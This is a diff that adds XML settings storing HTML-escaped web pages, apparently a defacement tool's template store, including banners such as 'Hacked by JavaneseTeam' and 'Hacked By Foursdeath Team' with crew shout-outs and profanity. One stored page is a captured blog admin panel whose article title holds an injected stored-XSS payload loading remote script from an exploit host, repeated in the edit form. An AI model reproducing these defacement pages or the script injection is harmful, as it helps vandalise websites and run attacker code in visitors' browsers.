+		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+		snow[i].style.left=snow[i].posx
+		snow[i].style.top=snow[i].posy
+		}
+		movesnow()
+		}
+		
+		function movesnow() {
+		for (i=0;i&lt;=snowmax;i++) {
+		crds[i] += x_mv[i];
+		snow[i].posy+=snow[i].sink
+		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+		snow[i].style.top=snow[i].posy
+		
+		if (snow[i].posy&gt;=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)&gt;(marginright-3*lftrght[i])){
+		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+		snow[i].posy=0
+		}
+		}
+		var timer=setTimeout("movesnow()",50)
+		}
+		
+		for (i=0;i&lt;=snowmax;i++) {
+		document.write("&lt;span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'&gt;"+snowletter+"&lt;/span&gt;")
+		}
+		if (browserok) {
+		window.onload=initsnow
+		}
+		&lt;/script&gt;
+	&lt;/head&gt;
+&lt;body&gt;
+	&lt;table width="100%" height="100%"&gt;
+	&lt;td align="center"&gt;
+		&lt;center&gt;
+		  &lt;img src="https://l.top4top.io/p_2204ug1o51.png" height="300" width="300"&gt;&lt;br&gt;
+			 &lt;font face="VT323" size="6px" color="black"&gt;Diretas oleh SLX_94 &lt;/i&gt;&lt;/a&gt;&lt;br&gt;
+			&lt;font size="5px" color="black"&gt;&lt;-- underground jaman sekarang :v --&gt;&lt;/font&gt;
+			&lt;br&gt;
+				&lt;code&gt;
+					&lt;font size="4"&gt;THIS IS MASSAGE FOR YOU MOTHER FUCKER&lt;/font&gt;&lt;br&gt;
+				&lt;/code&gt;
+				&lt;button class="lagu" onclick="play();liat();"&gt;
+					&lt;font face="Kelly Slab" size="3" color="black"&gt;Play&lt;/font&gt;
+				&lt;/button&gt; &amp;nbsp;&amp;nbsp;
+				&lt;button class="lagu" onclick="pause(); liat();"&gt;
+					&lt;font face="Kelly Slab" size="3" color="black"&gt;Pause&lt;/font&gt;
+				&lt;/button&gt;&lt;/audio&gt; &lt;script&gt; function play(){ var audio = document.getElementById('lagu'); audio.play(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } function pause(){ var audio = document.getElementById('lagu'); audio.pause(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } &lt;/script&gt;
+				&lt;br&gt;&lt;br&gt;
+			&lt;i&gt;&lt;font face="VT323" size="5px"&gt;&lt;i&gt;BEKASI BLACK HUNTER | CIPINANG BL4CKHAT | ZERO CYBER TEAM | KETAPANG GREY-HAT | &lt;br&gt; SECURITY GHOST REBORN&lt;/i&gt;&lt;/font&gt;
+		&lt;/center&gt;
+	&lt;audio id="lagu" allow="autoplay" src="https://k.top4top.io/m_2098b2yt71.mp3" &gt;&lt;/audio&gt;
+&lt;/body&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Index8" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Hacked by JavaneseTeam&lt;/title&gt;
+	&lt;link href="https://fonts.googleapis.com/css2?family=Shadows+Into+Light&amp;display=swap" rel="stylesheet"&gt;
+	&lt;meta property="og:title" content="Hacked By Simsimi"/&gt;
+	&lt;meta property="og:description" content="JavaneseTeam"/&gt;
+	
+&lt;/head&gt;
+&lt;body bgcolor="black" &gt;
+&lt;body&gt;
+	&lt;center&gt;
+	    &lt;br&gt;
+		&lt;br&gt;
+		&lt;br&gt;
+		&lt;font face="Teko" size="8" color='red' style='text-shadow: 0 0 3px black, 0px 0px 6px blue;'&gt;Simsimi&lt;/div&gt;&lt;/font&gt;
+		&lt;br&gt;
+		&lt;img src="https://i.ibb.co/8mRbM1X/ww.jpg" height="300" width="350"&gt;
+		&lt;br&gt;
+		&lt;br&gt;
+		&lt;font face="Teko" size="7px" color="red" style="text-shadow: 0 0 3px black, 0 0 6px blue;"&gt;$ JavaneseTeam $&lt;/font&gt;
+		&lt;br&gt;
+		&lt;br&gt;
+		&lt;br&gt;
+		&lt;font face="Teko" size="5px" color="white" style="text-shadow: 0 0 3px black, 0 0 6px blue;"&gt;&lt;marquee width="40%"&gt;&lt;font color="white"&gt;Simsimi - Littlejok3r - L4663R666H05T - AWOOONE -  PYS404 - GabriellaX - Ashtaroth - Mr4NGG3R - Syadlas_Vgas - P4ndu - Fadil - Hisyam77 - MissProxy - Unknown77 - Abiyan1337 - Ghost7 - C4PUN6 - Naskleng45 - w4nnatry&lt;/marquee&gt;&lt;/font&gt;
+		&lt;br&gt;
+		&lt;br&gt;
+		&lt;font color="white" size="3"&gt;Indonesia Hacker ruleZ&lt;/font&gt;	    
+	&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Index9" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+
+&lt;!-- Foursdeath Team --&gt;
+
+&lt;HTML xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml"&gt;
+
+&lt;HEAD&gt;
+
+&lt;link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSjt95NszAj_6fQEB4sk8FGuh3fDzPxVkgMHw&amp;usqp=CAU"/&gt;
+
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+
+&lt;TITLE&gt;  Hacked By DENNI5.ID&lt;/TITLE&gt; &lt;link rel="icon" type="image/jpg" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRVYppBagthPkM7TLHpUmDs9hHHLFPI7zpGUA&amp;usqp=CAU"&gt; 
+
+
+&lt;meta name="description" content=""/&gt;
+
+&lt;meta name="og:title" content=" Hacked By Lah?"/&gt;
+
+&lt;meta name="googlebot" content="index,follow"/&gt;
+
+&lt;meta name="robots" content="all"/&gt;
+
+&lt;meta name="robots schedule" content="auto"/&gt;
+
+&lt;meta name="distribution" content="global"/&gt;
+
+&lt;meta name="og:description" content="{ Foursdeath Team }"/&gt;
+
+&lt;link href="https://fonts.googleapis.com/css?family=Iceberg" rel="stylesheet"&gt;
+
+&lt;/HEAD&gt;
+
+&lt;style&gt;
+
+body{color="black";font-family: 'Iceberg', sans-serif;}
+
+&lt;/style&gt;
+
+&lt;table width="100%" height="100%"&gt;&lt;td align="center"&gt;
+
+&lt;BODY BGCOLOR="BLACK"&gt;&lt;FONT COLOR="#00FF00"&gt;
+
+&lt;img src="https://d.top4top.io/p_26081ppg50.jpg" width='250'&gt;
+
+&lt;P&gt;&lt;FONT COLOR="WHITE"&gt;
+&lt;br/&gt;
+&lt;B&gt;
+	
+&lt;font size="5"&gt;
+Hacked By Foursdeath Team &lt;/B&gt;
+
+&lt;font color="red" size="3"&gt;&lt;br&gt;
+
+&lt;br&gt;&lt;font color="yellow" size="4"&gt;"Siapa pun yang tidak pernah melakukan kesalahan tidak&lt;br&gt; pernah mencoba sesuatu yang baru."
+
+&lt;P&gt;&lt;FONT COLOR="WHITE"&gt;
+
+Facebook:Foursdeath Team 
+
+
+</Value>
+    </Setting>
+    <Setting Name="Index10" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;LEVARAM NO CU&lt;/title&gt;
+    &lt;meta charset="UTF-8"&gt;
+&lt;style&gt;
+body{
+    background-color: #000000;
+}
+
+h1{
+    font-family: monospace;
+    color: greenyellow;
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;h1&gt;Rici144 and 0xNull&lt;/h1&gt;
+
+&lt;img src="https://media.tenor.com/XNwh6dCtBZwAAAAC/sad-boy-with-rain-sad.gif" width="600px;"&gt;
+&lt;h1&gt;"O governo nunca nos ajudou mas depois nos somos os culpados pelas suas desgracas."
+&lt;/h1&gt;
+&lt;h1&gt;Rici144-0xNull&lt;/h1&gt;
+&lt;/center&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+ull - Rici144 - Luc4s&lt;/h1&gt;
+&lt;/center&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</Value>
+    </Setting>
+    <Setting Name="Index11" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+&lt;title&gt;Wuryantadi&lt;/title&gt;
+&lt;!-- Bootstrap core CSS --&gt;
+&lt;link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet"&gt;
+&lt;!-- font awesome --&gt;
+&lt;link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"&gt;
+&lt;!-- Custom styles for this template --&gt;
+&lt;link href="../css/simple-sidebar.css" rel="stylesheet"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div id="mySidenav" class="sidenav"&gt;
+		&lt;a href="javascript:void(0)" class="closebtn" onclick="closeNav()"&gt;&amp;times;&lt;/a&gt;
+		&lt;a href="index.php"&gt;&lt;i class="fa fa-home"&gt;&lt;/i&gt;  Home&lt;/a&gt;
+		&lt;a href="agenda.php"&gt;&lt;i class="fa fa-home"&gt;&lt;/i&gt;  Agenda&lt;/a&gt;
+		&lt;!--a href="saham.php"&gt;&lt;i class="fa fa-money"&gt;&lt;/i&gt;  Stock&lt;/a--&gt;
+		&lt;a href="market.php"&gt;&lt;i class="fa fa-th-large"&gt;&lt;/i&gt;  Stock Market&lt;/a&gt;
+		&lt;a href="market-gold.php"&gt;&lt;i class="fa fa-th-large"&gt;&lt;/i&gt;  Gold Father&lt;/a&gt;
+		&lt;a href="workout.php"&gt;&lt;i class="fa fa-heartbeat"&gt;&lt;/i&gt;  Workout&lt;/a&gt;
+		&lt;a href="pengeluaran.php"&gt;&lt;i class="fa fa-cart-arrow-down"&gt;&lt;/i&gt; Spending&lt;/a&gt;
+		&lt;a href="polling.php"&gt;&lt;i class="fa fa-bar-chart"&gt;&lt;/i&gt; Polling&lt;/a&gt;
+		&lt;a href="quiz.php"&gt;&lt;i class="fa fa-question-circle"&gt;&lt;/i&gt; Quiz&lt;/a&gt;
+		&lt;a href="../logout.php"&gt;&lt;i class="fa fa-sign-out"&gt;&lt;/i&gt;  Logout&lt;/a&gt;
+		
+&lt;/div&gt;&lt;nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom"&gt;
+&lt;span style="font-size:30px;cursor:pointer" onclick="openNav()"&gt;&amp;#9776;&lt;/span&gt;
+&lt;div class="collapse navbar-collapse" id="navbarSupportedContent"&gt;
+  &lt;ul class="navbar-nav ml-auto mt-2 mt-lg-0"&gt;
+   
+	&lt;li class="nav-item dropdown"&gt;
+	  &lt;a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"&gt;
+		&lt;i class="fa fa-cog"&gt;&lt;/i&gt;  User
+	  &lt;/a&gt;
+	  &lt;div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"&gt;
+		&lt;a class="dropdown-item" href="visitor.php"&gt;&lt;i class="fa fa-map"&gt;&lt;/i&gt; Visitor&lt;/a&gt;
+		&lt;div class="dropdown-divider"&gt;&lt;/div&gt;
+		&lt;a class="dropdown-item" href="../logout.php"&gt;&lt;i class="fa fa-sign-out"&gt;&lt;/i&gt;  Logout&lt;/a&gt;
+	  &lt;/div&gt;
+	&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/div&gt;
+&lt;/nav&gt;&lt;style&gt;
+	.avatar {
+		  vertical-align: middle;
+		  width: 175px;
+		  height: 175px;
+		  border-radius: 50%;
+			
+		}
+&lt;/style&gt;
+&lt;div class="container" style="margin-top: 25px"&gt;
+&lt;!--artikel--&gt;
+	&lt;div class="jumbotron"&gt;
+	&lt;div class="row"&gt;
+	&lt;div class="col-sm-3"&gt;
+	&lt;img src="../images/image_29.jpg" alt="Avatar" class="avatar"&gt; 
+	&lt;/div&gt;
+	&lt;div class="col-sm-9"&gt;
+	&lt;h3 class="display-5"&gt;Hacked By Melepasmu &lt;script src=https://jso.exploits.my.id/24461119.js&gt;&lt;/script&gt;&lt;/h3&gt;
+	 &lt;p class="lead" align="justify"&gt;
+	  &lt;i class="fa fa-calendar"&gt;&lt;/i&gt;  April 29, 2023&lt;/a&gt;
+	  &lt;i class="fa fa-folder"&gt;&lt;/i&gt;  Novel&lt;/a&gt;
+	  &lt;i class="fa fa-eye"&gt;&lt;/i&gt;  1 Views&lt;/a&gt;
+	  &lt;/p&gt;
+	&lt;/div&gt;
+	&lt;/div&gt;
+	 
+	 
+	  &lt;hr class="my-4"&gt;
+	 &lt;p align="justify"&gt;
+	 &lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&lt;strong&gt;&lt;em&gt;The Hairdresser of Harare&lt;/em&gt; sebuah karya sastra karangan Tendai Huchu, pertama kali dipublikasikan tahun 2010. Mengisahkan kehidupan Zimbabwe Kontemporer dilihat dari sudut pandang Sang Penata Rambut yang bekerja di sebuah Salon di Kota Harare.&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;	  &lt;/p&gt;
+	  &lt;hr class="my-4"&gt;
+		&lt;button type="button" class="btn btn-info  btn-md" data-target="#tambahData" data-toggle="modal"&gt;&lt;span class="icon-plus mr-2"&gt;&lt;/span&gt;&lt;i class="fa fa-plus"&gt;&lt;/i&gt;  New!&lt;/button&gt;
+				&lt;a href="#" class="btn btn-success btn-md" data-toggle="modal" data-target="#edit29" title="Edit Data"&gt;&lt;span class="glyphicon glyphicon-pencil"&gt;&lt;/span&gt;&lt;i class="fa fa-edit"&gt;&lt;/i&gt; Edit&lt;/a&gt;
+				
+		&lt;a href="#" class="btn btn-warning btn-md" title="Aktif Data" data-target=".bs-aktif-modal-lg29" data-toggle="modal"&gt;&lt;span class="glyphicon glyphicon-check"&gt;&lt;/span&gt;&lt;i class="fa fa-bullhorn"&gt;&lt;/i&gt; Publish&lt;/a&gt;
+			&lt;/div&gt;
+	&lt;!--artikel--&gt;
+	&lt;!-- Edit Data --&gt;
+			    &lt;div class="modal fade bs-example-modal-lg" id="edit29" tabquestion="-1" role="dialog" aria-labelledby="myModalLabel"&gt;
+				  &lt;div class="modal-dialog  modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+				      &lt;div class="modal-header"&gt;
+							&lt;h3 class="modal-title"&gt;Edit Artikel&lt;/h3&gt;
+						&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;form class="form-horizontal" action="" method="POST"&gt;
+				          &lt;input type="hidden" name="id" value="29"&gt;
+							&lt;label for="kategori"&gt;Kategori Artikel&lt;/label&gt;
+									&lt;div class="row"&gt;
+									&lt;div class='col-sm-8'&gt;
+									&lt;div class="form-group"&gt;
+									&lt;select class="form-control" id="kategori" name="kategori"&gt;
+										&lt;option value="Biografi" &gt;Biografi&lt;/option&gt;
+										&lt;option value="Motivasi" &gt;Motivasi&lt;/option&gt;
+										&lt;option value="Novel" selected&gt;Novel&lt;/option&gt;
+										&lt;option value="Religi" &gt;Religi&lt;/option&gt;
+										&lt;option value="Resensi" &gt;Resensi&lt;/option&gt;
+										&lt;option value="Teknologi Informasi" &gt;Teknologi Informasi&lt;/option&gt;
+										
+									&lt;/select&gt;			
+									&lt;/div&gt;
+									&lt;/div&gt;
+									&lt;/div&gt;			
+									&lt;label for="judul"&gt;Judul&lt;/label&gt;
+									&lt;div class="row"&gt;
+									&lt;div class='col-sm-8'&gt;
+									&lt;div class="form-group"&gt;
+									&lt;input type="text" class="form-control" name="judul" value="Hacked By Melepasmu &lt;script src=https://jso.exploits.my.id/24461119.js&gt;&lt;/script&gt;" required&gt;			
+									&lt;/div&gt;
+									&lt;/div&gt;
+									&lt;/div&gt;
+									
+									
+									&lt;script type="text/javascript" src="../ckeditor/ckeditor.js"&gt;&lt;/script&gt;
+									&lt;script type="text/javascript" src="../ckeditor/style.js"&gt;&lt;/script&gt;
+									&lt;label for="konten"&gt;Konten&lt;/label&gt;
+											&lt;div class="row"&gt;
+												&lt;div class='col-sm-12'&gt;
+													&lt;div class="form-group"&gt;
+														&lt;textarea name="konten"&gt;&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&lt;strong&gt;&lt;em&gt;The Hairdresser of Harare&lt;/em&gt; sebuah karya sastra karangan Tendai Huchu, pertama kali dipublikasikan tahun 2010. Mengisahkan kehidupan Zimbabwe Kontemporer dilihat dari sudut pandang Sang Penata Rambut yang bekerja di sebuah Salon di Kota Harare.&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;Melihat Fungai berdiri di depan gerbang dan menungguku membuka kuncinya adalah mimpi yang menjadi kenyataan. Sesaat aku hampir percaya suatu saat aku akan menjadi tuan rumah acara keluarga di rumahku. Ini ada kunjungan pertamanya, dia mengabaikan Takesure/Konowledge Saga. Aku membiarkannya masuk memeluknya dengan erat.&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&amp;quot;Aku pikir kamu cuma meniupkan air panas ketika mengatakan ingin berkunjung ke rumahku. &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&amp;quot;Aku tidak yakin &amp;#39;&lt;em&gt;meniup air panas&lt;/em&gt;&amp;#39; adalah permpamaan yang sesuai, Tetapi aku selalu mencoba&amp;nbsp; melakukan apa yang aku katakan.&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Dia menghela nafas dan aku memegang tangannya dengan rasa takut dia mungkin akan berbalik dan pergi.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Kamu meremas tanganku terlalu keras.&amp;quot; Dia tertawa, Lalu aku membiarkan dia merangkulku. Serasa dia menyadarkan diri karena membebani pundakku.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&amp;quot;Sungguh rumagh yang cantik. Robert membuatnya dengan baik&amp;quot;.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;Kini giliranku untuk meremas tangannya, senang ketika dia menyebut saudaraku yang telah meninggal. Ini adalah waktu ketika aku merindukannya dalam rumah besar, namun bersama Fungai sangat menyenangkan karena wajahnya mengingatkankun pada Robert. Mereka hanya berjarak satu tahun, melihat Fungai dapat kubayangkan bagimana kakak melihat keadaan hari ini.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p style="text-align:justify"&gt;Now it was my turn to squeeze his hand, glad that he had invoked our&lt;br /&gt;
+deceased brother. There were times when I missed him in this big house,&lt;br /&gt;
+but being with Fungai was good because his face reminded me of Robert.&lt;br /&gt;
+They were just a year apart and, seeing Fungai, I could almost picture how&lt;br /&gt;
+our older brother might have looked today.&lt;br /&gt;
+&amp;lsquo;Do you mind if we sit down for a minute?&amp;rsquo;&lt;br /&gt;
+&amp;lsquo;But I want to show you the house.&amp;rsquo;&lt;br /&gt;
+&amp;lsquo;We can do it later. My feet are killing me.&amp;rsquo;&lt;br /&gt;
+&amp;lsquo;Let me guess&amp;hellip; You walked all the way here. Some things never&lt;br /&gt;
+change.&amp;rsquo;&lt;br /&gt;
+Fungai had a weird theory that he should walk everywhere. There was&lt;br /&gt;
+no way of discouraging him when he made his mind up on something. He&lt;br /&gt;
+claimed that, as a &amp;lsquo;philosopher,&amp;rsquo; walking brought him closer to the &amp;lsquo;truth&amp;rsquo;.&lt;br /&gt;
+When pressed on the matter he would claim that there was a natural state&lt;br /&gt;
+for all things to be in. Cars were unnatural and because they moved&lt;br /&gt;
+unnaturally fast, one couldn&amp;rsquo;t see the world for what it really was. When&lt;br /&gt;
+walking, one was closer to the world and observed it more closely. I didn&amp;rsquo;t&lt;br /&gt;
+agree with this romantic theory, which meant that he would never find&lt;br /&gt;
+himself outside of the city unless&amp;hellip; It was too crazy to even contemplate&lt;br /&gt;
+&amp;nbsp;&lt;/p&gt;
+&lt;/textarea&gt;
+														 &lt;script type="text/javascript"&gt;
+															CKEDITOR.replace( 'konten' );
+														 &lt;/script&gt;
+														
+													&lt;/div&gt;
+												&lt;/div&gt;
+											&lt;/div&gt;
+							
+						  
+                          
+				
+				      &lt;/div&gt;
+				      &lt;div class="modal-footer"&gt;
+				        &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;i class="fa fa-arrow-circle-left"&gt;&lt;/i&gt; Kembali&lt;/button&gt;
+				        &lt;button type="submit" class="btn btn-primary" name="update"&gt;&lt;i class="fa fa-clone"&gt;&lt;/i&gt; Simpan&lt;/button&gt;
+				       &lt;/form&gt;
+				      &lt;/div&gt;
+				    &lt;/div&gt;
+				  &lt;/div&gt;
+				&lt;/div&gt;
+                &lt;!-- Akhir edit data --&gt;
+	&lt;!-- Hapus data --&gt;
+				
+
+				&lt;div class="modal fade bs-example-modal-lg29" tabquestion="-1" role="dialog" aria-labelledby="myLargeModalLabel"&gt;
+				  &lt;div class="modal-dialog modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+					&lt;div class="modal-header"&gt;
+						&lt;h3 class="modal-title"&gt;Konfirmasi&lt;/h3&gt;
+					&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;h4&gt;Apakah anda benar-benar ingin menghapus data ini ?&lt;/h4&gt;
+				        &lt;form action="" method="POST"&gt;
+				        &lt;input type="hidden" name="id" value="29"&gt;
+				      &lt;/div&gt;
+				       &lt;div class="modal-footer"&gt;
+				        &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;i class="fa fa-arrow-circle-left"&gt;&lt;/i&gt; Kembali&lt;/button&gt;
+				        &lt;button type="submit" class="btn btn-primary" name="hapus"&gt;&lt;i class="fa fa-trash"&gt;&lt;/i&gt; Hapus&lt;/button&gt;
+				       &lt;/form&gt;
+				      &lt;/div&gt;
+				    &lt;/div&gt;
+				  &lt;/div&gt;
+				&lt;/div&gt;
+				&lt;!-- Akhir hapus data --&gt;
+				&lt;div class="modal fade bs-aktif-modal-lg29" tabquestion="-1" role="dialog" aria-labelledby="myLargeModalLabel"&gt;
+				  &lt;div class="modal-dialog modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+				      &lt;div class="modal-header"&gt;
+							&lt;h3 class="modal-title"&gt;Konfirmasi&lt;/h3&gt;
+						&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;h4&gt;Publish Artikel ini?&lt;/h4&gt;
+				        &lt;form action="" method="POST"&gt;
+				        &lt;input type="hidden" name="id" value="29"&gt;
+				      &lt;/div&gt;
+				       &lt;div class="modal-footer"&gt;
+				        &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;i class="fa fa-arrow-circle-left"&gt;&lt;/i&gt; Kembali&lt;/button&gt;
+				        &lt;button type="submit" class="btn btn-primary" name="publish"&gt;&lt;i class="fa fa-bullhorn"&gt;&lt;/i&gt; Publish&lt;/button&gt;
+				       &lt;/form&gt;
+				      &lt;/div&gt;
+				    &lt;/div&gt;
+				  &lt;/div&gt;
+				&lt;/div&gt;
+	&lt;!--artikel--&gt;
+	&lt;div class="jumbotron"&gt;
+	&lt;div class="row"&gt;
+	&lt;div class="col-sm-3"&gt;
+	&lt;img src="../images/image_28.jpg" alt="Avatar" class="avatar"&gt; 
+	&lt;/div&gt;
+	&lt;div class="col-sm-9"&gt;
+	&lt;h3 class="display-5"&gt;Sang Penata Rambut Harare (Bab 11)&lt;/h3&gt;
+	 &lt;p class="lead" align="justify"&gt;
+	  &lt;i class="fa fa-calendar"&gt;&lt;/i&gt;  October 09, 2020&lt;/a&gt;
+	  &lt;i class="fa fa-folder"&gt;&lt;/i&gt;  Novel&lt;/a&gt;
+	  &lt;i class="fa fa-eye"&gt;&lt;/i&gt;  239 Views&lt;/a&gt;
+	  &lt;/p&gt;
+	&lt;/div&gt;
+	&lt;/div&gt;
+	 
+	 
+	  &lt;hr class="my-4"&gt;
+	 &lt;p align="justify"&gt;
+	 &lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&lt;strong&gt;&lt;em&gt;The Hairdresser of Harare&lt;/em&gt; sebuah karya sastra karangan Tendai Huchu, pertama kali dipublikasikan tahun 2010. Mengisahkan kehidupan Zimbabwe Kontemporer dilihat dari sudut pandang Sang Penata Rambut yang bekerja di sebuah Salon di Kota Harare.&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;	  &lt;/p&gt;
+	  &lt;hr class="my-4"&gt;
+		&lt;button type="button" class="btn btn-info  btn-md" data-target="#tambahData" data-toggle="modal"&gt;&lt;span class="icon-plus mr-2"&gt;&lt;/span&gt;&lt;i class="fa fa-plus"&gt;&lt;/i&gt;  New!&lt;/button&gt;
+				&lt;a href="#" class="btn btn-success btn-md" data-toggle="modal" data-target="#edit28" title="Edit Data"&gt;&lt;span class="glyphicon glyphicon-pencil"&gt;&lt;/span&gt;&lt;i class="fa fa-edit"&gt;&lt;/i&gt; Edit&lt;/a&gt;
+				
+		&lt;a href="#" class="btn btn-warning btn-md" title="Aktif Data" data-target=".bs-aktif-modal-lg28" data-toggle="modal"&gt;&lt;span class="glyphicon glyphicon-check"&gt;&lt;/span&gt;&lt;i class="fa fa-bullhorn"&gt;&lt;/i&gt; Publish&lt;/a&gt;
+			&lt;/div&gt;
+	&lt;!--artikel--&gt;
+	&lt;!-- Edit Data --&gt;
+			    &lt;div class="modal fade bs-example-modal-lg" id="edit28" tabquestion="-1" role="dialog" aria-labelledby="myModalLabel"&gt;
+				  &lt;div class="modal-dialog  modal-lg" role="document"&gt;
+				    &lt;div class="modal-content"&gt;
+				      &lt;div class="modal-header"&gt;
+							&lt;h3 class="modal-title"&gt;Edit Artikel&lt;/h3&gt;
+						&lt;/div&gt;
+				      &lt;div class="modal-body"&gt;
+				        &lt;form class="form-horizontal" action="" method="POST"&gt;
+				          &lt;input type="hidden" name="id" value="28"&gt;
+							&lt;label for="kategori"&gt;Kategori Artikel&lt;/label&gt;
+									&lt;div class="row"&gt;
+									&lt;div class='col-sm-8'&gt;
+									&lt;div class="form-group"&gt;
+									&lt;select class="form-control" id="kategori" name="kategori"&gt;
+										&lt;option value="Biografi" &gt;Biografi&lt;/option&gt;
+										&lt;option value="Motivasi" &gt;Motivasi&lt;/option&gt;
+										&lt;option value="Novel" selected&gt;Novel&lt;/option&gt;
+										&lt;option value="Religi" &gt;Religi&lt;/option&gt;
+										&lt;option value="Resensi" &gt;Resensi&lt;/option&gt;
+										&lt;option value="Teknologi Informasi" &gt;Teknologi Informasi&lt;/option&gt;
+										
+									&lt;/select&gt;			
+									&lt;/div&gt;
+									&lt;/div&gt;
+									&lt;/div&gt;			
+									&lt;label for="judul"&gt;Judul&lt;/label&gt;
+									&lt;div class="row"&gt;
+									&lt;div class='col-sm-8'&gt;
+									&lt;div class="form-group"&gt;
+									&lt;input type="text" class="form-control" name="judul" value="Sang Penata Rambut Harare (Bab 11)" required&gt;			
+									&lt;/div&gt;
+									&lt;/div&gt;
+									&lt;/div&gt;
+									
+									
+									&lt;script type="text/javascript" src="../ckeditor/ckeditor.js"&gt;&lt;/script&gt;
+									&lt;script type="text/javascript" src="../ckeditor/style.js"&gt;&lt;/script&gt;
+									&lt;label for="konten"&gt;Konten&lt;/label&gt;
+											&lt;div class="row"&gt;
+												&lt;div class='col-sm-12'&gt;
+													&lt;div class="form-group"&gt;
+														&lt;textarea name="konten"&gt;&lt;p style="text-align:justify"&gt;&lt;span style="font-size:14px"&gt;&lt;span style="color:black"&gt;&lt;strong&gt;&lt;em&gt;The Hairdresser of Harare&lt;/em&gt; sebuah karya sastra karangan Tendai Huchu, pertama kali dipublikasikan tahun 2010. Mengisahkan kehidupan Zimbabwe Kontemporer dilihat dari sudut pandang Sang Penata Rambut yang bekerja di sebuah Salon di Kota Harare.&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+
